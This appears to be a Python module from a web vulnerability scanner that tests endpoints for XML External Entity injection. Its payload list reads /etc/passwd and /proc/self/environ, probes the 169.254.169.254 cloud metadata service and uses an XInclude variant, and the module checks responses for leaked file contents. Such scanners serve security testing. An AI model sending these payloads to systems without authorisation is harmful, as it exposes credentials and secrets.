"""
modules/xxe_detector.py - XML External Entity (XXE) Injection Detection
Detects XXE via DOCTYPE injection in XML request bodies and file upload endpoints.
"""

import re
import logging
import urllib.parse
from typing import Dict, List, Any, Optional
from core.http_engine import HTTPClient
from core.state_manager import StateManager

logger = logging.getLogger("recon.xxe_detector")


class XXEDetector:
    """
    Detects XML External Entity (XXE) injection vulnerabilities.

    Tests endpoints that:
    - Accept XML content-type
    - Process XML data in request body
    - Have file upload functionality accepting XML/SVG/DOCX
    - Parse XML-based API payloads (SOAP, REST with XML)
    """

    XXE_PAYLOADS = [
        # Classic XXE - read /etc/passwd
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
        # XXE via /etc/hosts
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root><data>&xxe;</data></root>',
        # Blind XXE - OOB via parameter entity
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/xxe-probe">%xxe;]><root/>',
        # XXE via SSRF to internal
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><data>&xxe;</data></root>',
        # XXE with nested entity
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root><data>&xxe;</data></root>',
        # XXE in SOAP body
        '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>',
        # SVG XXE
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        # XInclude attack (when DOCTYPE is blocked)
        '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>',
    ]

    XML_CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/soap+xml",
        "application/xhtml+xml",
        "image/svg+xml",
    ]

    XXE_INDICATORS = [
        r"root:x:0:0",
        r"daemon:x:",
        r"www-data:",
        r"127\.0\.0\.1\s+localhost",
        r"AMI ID",
        r"availability-zone",
        r"PATH=/",
        r"HOME=/root",
        r"raspberrypi",
    ]

    def __init__(self, state: StateManager = None, http_client: HTTPClient = None):
        self.state = state
        self.http_client = http_client or HTTPClient()

    def detect(self, endpoints: List[Any], progress_cb=None) -> Dict[str, Any]:
        """Scan endpoints for XXE vulnerabilities."""
        logger.info(f"[XXE] Starting XXE detection on {len(endpoints)} endpoints")

        results = {
            "vulnerabilities": [],
            "endpoints_tested": 0,
            "xxe_confirmed": 0,
        }

        for i, endpoint in enumerate(endpoints):
            if progress_cb:
                progress_cb(i, len(endpoints))

            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
                method = (endpoint.get("method") or "POST").upper()
                content_type = endpoint.get("content_type", "")
            else:
                url = str(endpoint)
                method = "POST"
                content_type = ""

            if not url:
                continue

            # Only test endpoints that likely accept XML
            if not self._is_xml_candidate(url, content_type):
                results["endpoints_tested"] += 1
                continue

            xxe_result = self._test_xxe(url, method)
            if xxe_result.get("vulnerable"):
                results["vulnerabilities"].append(xxe_result)
                results["xxe_confirmed"] += 1

            results["endpoints_tested"] += 1

        logger.info(f"[XXE] Found {results['xxe_confirmed']} XXE vulnerabilities")
        return results

    def _is_xml_candidate(self, url: str, content_type: str) -> bool:
        """Check if endpoint is likely to accept XML."""
        url_lower = url.lower()
        xml_keywords = [
            "xml", "soap", "wsdl", "api", "upload", "import",
            "feed", "rss", "atom", "svg", "docx", "xlsx", "odf",
        ]
        if any(kw in url_lower for kw in xml_keywords):
            return True
        if content_type and any(ct in content_type.lower() for ct in ["xml", "soap"]):
            return True
        # Test all POST endpoints - many accept XML
        return False

    def _test_xxe(self, url: str, method: str = "POST") -> Dict[str, Any]:
        """Test endpoint for XXE injection."""
        result = {
            "url": url,
            "method": method,
            "vulnerable": False,
            "confidence": 0.0,
            "evidence": [],
            "payloads_tested": 0,
        }

        for payload in self.XXE_PAYLOADS:
            result["payloads_tested"] += 1
            for ct in self.XML_CONTENT_TYPES[:3]:
                try:
                    headers = {"Content-Type": ct}
                    if method == "POST":
                        response = self.http_client.post(
                            url, data=payload.encode(), headers=headers, timeout=12
                        )
                    else:
                        response = self.http_client.request(
                            method, url, data=payload.encode(), headers=headers, timeout=12
                        )

                    indicators = self._check_xxe_indicators(response)
                    if indicators["score"] > 0.5:
                        result["vulnerable"] = True
                        result["confidence"] = max(result["confidence"], indicators["score"])
                        result["evidence"].append({
                            "payload_snippet": payload[:80],
                            "content_type": ct,
                            "indicator": indicators["reason"],
                            "status": response.status_code,
                        })
                        if result["confidence"] >= 0.8:
                            return result
                except Exception as e:
                    logger.debug(f"[XXE] Error testing {url}: {e}")
                    continue

        return result

    def _check_xxe_indicators(self, response) -> Dict[str, Any]:
        """Analyze response for XXE evidence."""
        score = 0.0
        reason = ""
        text = response.text if hasattr(response, "text") else ""

        for pattern in self.XXE_INDICATORS:
            if re.search(pattern, text):
                score = 0.95
                reason = f"File content exposed: matched '{pattern}'"
                return {"score": score, "reason": reason}

        # Check for partial disclosure or error revealing parser type
        xxe_errors = [
            "SAXParseException", "XMLSyntaxError", "xml.etree",
            "Xerces", "expat", "libxml2", "DOCTYPE",
            "External entity", "entity reference",
        ]
        for err in xxe_errors:
            if err.lower() in text.lower():
                score += 0.3
                reason = f"XML parser error: {err}"
                break

        # Blind indicator: response time anomaly or connection attempt
        if response.status_code in [200, 500] and len(text) > 0:
            if score > 0:
                score = min(score + 0.1, 1.0)

        return {"score": score, "reason": reason}


def detect_xxe(
    state: StateManager, endpoints: List[Any], progress_cb=None
) -> Dict[str, Any]:
    """Standalone function for XXE detection."""
    detector = XXEDetector(state=state)
    return detector.detect(endpoints, progress_cb)
